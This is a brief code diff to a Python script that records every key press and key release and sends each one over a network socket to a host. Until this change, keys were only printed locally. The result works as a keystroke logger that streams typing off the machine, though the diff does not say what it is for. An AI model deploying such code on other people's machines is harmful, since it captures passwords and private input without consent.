@@ -17,12 +17,21 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         except AttributeError:
             message = str(key)
 
-        sys.stdout.write(message)
-        sys.stdout.flush()
+        message = f'Press {message}'
+        # send the keystroke to the host
+        s.sendall(message.encode('utf-8'))
 
+    def on_release(key):
+        try:
+            message = key.char
+        except AttributeError:
+            message = str(key)
+
+        message = f'Release {message}'
         # send the keystroke to the host
         s.sendall(message.encode('utf-8'))
 
     # start listening to the keyboard
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
